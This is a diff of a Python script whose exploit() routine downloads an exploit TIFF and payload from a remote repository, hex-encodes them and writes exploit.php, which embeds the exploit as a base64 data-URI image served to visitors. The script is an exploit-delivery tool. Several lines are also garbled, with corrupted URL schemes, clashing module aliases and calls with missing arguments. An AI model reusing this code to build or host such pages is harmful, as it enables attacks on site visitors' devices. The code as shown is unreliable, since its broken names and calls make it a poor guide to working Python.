@@ -12,6 +12,7 @@ import struct as a
 import sys as s
 import time as r
 import wlib3 as o
+import urllib3 as cd
 import zlib as p
 from sentry_sdk.integrations.logging import LoggingIntegration
 g.packages.urllib3.disable_warnings()  # This is so we don't get some warning about SSL.
@@ -145,128 +146,121 @@ def startbreakfast():
   bc("Your breakfast is ready!")
   breakfast.display()
   bc("\a")
-def check(bg):
-  bg2=int(bg)
-  if (bg2 % 2)==0:
-    bc("{0} is Even".format(bg2))
-    v="even"
-    return v
-  else:
-    bc("{0} is Odd".format(bg2))
-    v="odd"
-    return v
-def exploit(k, x):
-  if k==0:
-    if x==1: #No Pre-Existing Mode
+def exploit(offset, secondary):
+  if offset == 0:
+    if secondary == 1: #No Pre-Existing Mode
       pre(0)
-      u(2)
-    elif x==2: #With Pre-Existing Mode
+      task(2)
+    elif secondary == 2: #With Pre-Existing Mode
       pre(1)
-      u(2)
-    elif x==3: #Download Hex Template Mode
+      task(2)
+    elif secondary == 3: #Download Hex Template Mode
       pre(1)
-      j._exit(0)
-    elif x==4: #Re-generate ac File mode
-      ac(0)
-  elif k==1:
+      os._exit(0)
+    elif secondary == 4: #Re-generate Credits File mode
+      credits(0)
+  elif offset == 1:
+    # Open in binary mode (so you don't read two byte line endings on Windows as one byte)
+    # and use with statement (always do this to avoid leaked file descriptors, unflushed files)
     with open('exploit.tiff', 'rb') as f:
-        hexv=l.hexlify(f.read())
-        m.dump((hexv.decode('utf-8')), open('hex.dat', 'wb'))
-  elif k==2:
-    v2=str(q.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
-    w2="bjs://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
-    downloadu(v2, w2)
-  elif k==3:
-    v1=str(q.Path(__file__).parent.absolute()) + "/" + "payload.bin"
-    w1="bjs://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
-    downloadu(v1, w1)
-  elif k==4:
-    ac(1)
-  elif k==5:
+        # Slurp the whole file and efficiently convert it to hex all at once
+        hexdata = l.hexlify(f.read())
+        m.dump((hexdata.decode('utf-8')), open('hex.dat', 'wb'))
+  elif offset == 2:
+    data2 = str(q.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
+    url2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
+    downloadtask(data2, url2)
+  elif offset == 3:
+    data1 = str(q.Path(__file__).parent.absolute()) + "/" + "payload.bin"
+    url1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
+    downloadtask(data1, url1)
+  elif offset == 4:
+    credits(1)
+  elif offset == 5:
     if j.path.exists("payload.bin"):
       j.remove("payload.bin")
-  elif k==6:
+  elif offset == 6:
     if j.path.exists("hex.dat"):
       j.remove("hex.dat")
-  elif k==7:
+  elif offset == 7:
     if j.path.exists("exploit.tiff"):
       j.remove("exploit.tiff")
-  elif k==8:
+  elif offset == 8:
     if j.path.exists("exploit.bin"):
       j.remove("exploit.bin")
-  elif k==9:
+  elif offset == 9:
     if j.path.exists("exploit.php"):
       j.remove("exploit.php")
   else:
-    t(0)
+    exploit(0)
 def run():
-  bi=open('hex.dat', 'rb')
-  f=m.load(bi)
+  load_file = open('hex.dat', 'rb')
+  f = m.load(load_file)
   with open('exploit.bin', 'wb') as fout:
     fout.write(
       l.unhexlify(f)
     )
-  t(6, 0)
-  v=open('exploit.bin', 'rb').read()
-  y=i.b64encode(v)
-  z=y.decode()
-  html='<?php\n$htmlcode="<img src=\\"v:image/png;base64,' + z + '\\">";\necho $htmlcode\n?>'
+  exploit(6, 0)
+  data = open('exploit.bin', 'rb').read()
+  bytes_base64 = i.b64encode(data)
+  text_base64 = bytes_base64.decode()
+  html = '<?php\n$htmlcode = "<img src=\\"data:image/png;base64,' + text_base64 + '\\">";\necho $htmlcode\n?>'
   open('exploit.php', 'w').write(html)
-  t(7, 0)
-  t(8, 0)
+  exploit(7, 0)
+  exploit(8, 0)
   return html
-def pre(abk):
-  if abk==0:
-    u(1)
-    u(0)
-    v=int(0)
-    return v
-  elif abk==1:
-    u(1)
-    v=int(0)
-    return v
-  elif abk==2:
-    t(5, 0)
-    u(0)
-    v="MSG:" + " " + str(q.Path(__file__).parent.absolute()) + " " + "DOWNLOADED!"
-    return v
-def ac(othrk):
-    aa="ac:\n"
-    bb=aa + "base64 implmentation by fmw42\n"
-    cc=bb + "hex implementation by falsetru\n"
-    dd=cc + "file to hex implementation by ShadowRanger\n"
-    ee=dd + "o downloading implementation by shazrow\n"
-    ff=ee + "exploit.bin based on exploit.tiff by planetbeing\n"
-    if othrk==0:
-      h=open("CREDITS.txt", "a")
+def pre(mainoffset):
+  if mainoffset == 0:
+    task(1)
+    task(0)
+    data = int(0)
+    return data
+  elif mainoffset == 1:
+    task(1)
+    data = int(0)
+    return data
+  elif mainoffset == 2:
+    exploit(5, 0)
+    task(0)
+    data = "MSG:" + " " + str(pathlib.Path(__file__).parent.absolute()) + " " + "DOWNLOADED!"
+    return data
+def credits(othroffset):
+    a = "credits:\n"
+    b = a + "base64 implmentation by fmw42\n"
+    c = b + "hex implementation by falsetru\n"
+    d = c + "file to hex implementation by ShadowRanger\n"
+    e = d + "urllib3 downloading implementation by shazrow\n"
+    f = e + "exploit.bin based on exploit.tiff by planetbeing\n"
+    if othroffset == 0:
+      h = open("CREDITS.txt", "a")
       h.write(f)
       h.close()
-    elif othrk==1:
-      bc(f)
-def u(bhk):
-  if bhk==0:
-    t(2, 0)
-    t(1, 0)
-  elif bhk==1:
-    t(5, 0)
-    t(4, 0)
-    t(3, 0)
-  elif bhk==2:
+    elif othroffset == 1:
+      print(f)
+def task(miscoffset):
+  if miscoffset == 0:
+    exploit(2, 0)
+    exploit(1, 0)
+  elif miscoffset == 1:
+    exploit(5, 0)
+    exploit(4, 0)
+    exploit(3, 0)
+  elif miscoffset == 2:
     run()
     j._exit(0)
-def downloadu(v, w):
-  bj=o.PoolManager()
-  r=bj.request('GET', w, preload_content=False)
-  bk=n.randint(10, 1000)
-  with open(v, 'wb') as out:
+def downloadtask(data, url):
+  http = cd.PoolManager()
+  r = http.request('GET', url, preload_content=False)
+  chunk_size = n.randint(10, 1000)
+  with open(data, 'wb') as out:
     while True:
-      v=r.read(bk)
-      if not v:
+      data = r.read(chunk_size)
+      if not data:
         break
-      out.write(v)
+      out.write(data)
   r.release_conn()
 def getcurrentpath():
-	a=str(pathlib.Path(__file__).parent.absolute())
+	a=str(q.Path(__file__).parent.absolute())
 	return a
 def compressmultiple(a, b, c, d):
 	cc.compress_multiple([a, b], d, c, 4, progress)
